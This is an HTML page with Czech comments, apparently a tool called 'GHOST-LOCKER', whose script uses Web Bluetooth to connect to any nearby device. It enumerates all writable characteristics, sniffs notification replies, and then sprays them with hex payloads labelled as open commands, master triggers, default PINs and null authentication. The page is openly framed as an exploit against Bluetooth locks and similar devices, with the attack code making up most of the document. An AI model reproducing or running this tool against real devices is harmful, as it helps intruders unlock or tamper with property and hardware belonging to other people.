<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST-LOCKER v3.5 [ELITE-AUDIT]</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #ghost-ui { width: 95%; max-width: 400px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.4); border-radius: 10px; position: relative; }
        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; text-shadow: 0 0 10px #0f0; font-size: 1.3em; letter-spacing: 2px; }
        #output { height: 300px; overflow-y: auto; background: #050505; border: 1px solid #1a1a1a; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.5; scroll-behavior: smooth; }
        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; margin-bottom: 10px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #0f0; color: #000; box-shadow: 0 0 15px #0f0; }
        .btn-red { border-color: #f00; color: #f00; }
        .btn-red:hover { background: #f00; color: #000; box-shadow: 0 0 15px #f00; }
        .status-tag { color: #888; font-size: 9px; margin-bottom: 5px; display: block; }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.5); box-shadow: 0 0 20px #0f0; animation: scan 4s linear infinite; pointer-events: none; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #0f0; }
    </style>
</head>
<body>

<div id="ghost-ui">
    <div class="scan-line"></div>
    <div class="header">GHOST-LOCKER v3.5</div>
    <span class="status-tag">SYSTEM STATUS: READY_TO_INJECT</span>
    <div id="output"></div>
    
    <button id="scan-btn" class="btn">[1] INITIALIZE SCAN</button>
    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] EXECUTE EXPLOIT</button>
</div>

<script>
    const GhostCore = {
        device: null,
        server: null,
        writableChars: [],

        log(msg, color = "#0f0") {
            const out = document.getElementById('output');
            const entry = document.createElement('div');
            entry.style.color = color;
            entry.innerHTML = `> ${msg}`;
            out.appendChild(entry);
            out.scrollTop = out.scrollHeight;
        },

        delay: (ms) => new Promise(res => setTimeout(res, ms)),

        async startScan() {
            this.log("VYHLEDÁVÁM CÍLE...", "#0ff");
            try {
                // Přijímáme všechna zařízení bez omezení UUID
                this.device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: [] // Zde se dají doplnit specifické UUID, pokud je znáš
                });

                this.log(`CÍL ZAMĚŘEN: ${this.device.name || "Neznámý"}`, "#ff0");
                this.server = await this.device.gatt.connect();
                this.log("GATT SERVER PŘIPOJEN. ANALÝZA...", "#ff0");

                const services = await this.server.getPrimaryServices();
                this.writableChars = [];

                for (const service of services) {
                    this.log(`SLUŽBA: ${service.uuid.slice(4,8).toUpperCase()}`, "#555");
                    const chars = await service.getCharacteristics();
                    
                    for (const char of chars) {
                        // Kontrola oprávnění
                        if (char.properties.write || char.properties.writeWithoutResponse) {
                            this.writableChars.push(char);
                            this.log(`NAJDEN ZÁPIS: ${char.uuid.slice(4,8)}`, "#f0f");

                            // AUTOMATICKÝ ODPOSLECH (SNIFFING)
                            if (char.properties.notify || char.properties.indicate) {
                                try {
                                    await char.startNotifications();
                                    char.addEventListener('characteristicvaluechanged', (e) => {
                                        const val = new Uint8Array(e.target.value.buffer);
                                        const hex = Array.from(val).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ');
                                        this.log(`ODPOVĚĎ [${char.uuid.slice(4,8)}]: ${hex}`, "#f80");
                                    });
                                    this.log(`ODPOSLECH AKTIVNÍ...`, "#0f0");
                                } catch (e) { this.log("SNIFF ERROR", "#444"); }
                            }
                        }
                    }
                }

                if (this.writableChars.length > 0) {
                    document.getElementById('attack-btn').style.display = "block";
                    this.log("SYSTÉM PŘIPRAVEN K ÚTOKU", "#0f0");
                }
            } catch (err) { this.log("CHYBA: " + err.message, "#f00"); }
        },

        async runExploit() {
            this.log("SPOUŠTÍM SEKVENCI PAYLOADŮ...", "#f00");
            
            // Rozšířená databáze payloadů (HEX kódy pro otevření/reset)
            const payloads = [
                [0x55, 0x01, 0x01, 0x00, 0x57], // Standard Open
                [0xA5, 0x00, 0x01, 0x01, 0x05], // Master Trigger
                [0x01, 0x02, 0x03, 0x04],       // Default PIN
                [0x31, 0x32, 0x33, 0x34],       // ASCII "1234"
                [0x00, 0x00, 0x00, 0x00],       // Null Auth
                [0x4f, 0x50, 0x45, 0x4e]        // ASCII "OPEN"
            ];

            for (let char of this.writableChars) {
                for (let data of payloads) {
                    try {
                        const buffer = new Uint8Array(data);
                        
                        // Inteligentní volba zápisu
                        if (char.properties.writeWithoutResponse) {
                            await char.writeValueWithoutResponse(buffer);
                        } else {
                            await char.writeValue(buffer);
                        }

                        this.log(`INJEKCE -> ${char.uuid.slice(4,8)} [HEX: ${data[0].toString(16)}]`, "#0f0");
                        
                        // KRITICKÁ PAUZA: Bluetooth potřebuje čas na zpracování
                        await this.delay(200); 
                    } catch (e) {
                        this.log(`SELHÁNÍ: ${char.uuid.slice(4,8)}`, "#555");
                    }
                }
            }
            this.log("AUDIT DOKONČEN.", "#fff");
        }
    };

    document.getElementById('scan-btn').onclick = () => GhostCore.startScan();
    document.getElementById('attack-btn').onclick = () => GhostCore.runExploit();

    GhostCore.log("GHOST-LOCKER v3.5 INITIALIZED...", "#0f0");
</script>

</body>
</html>
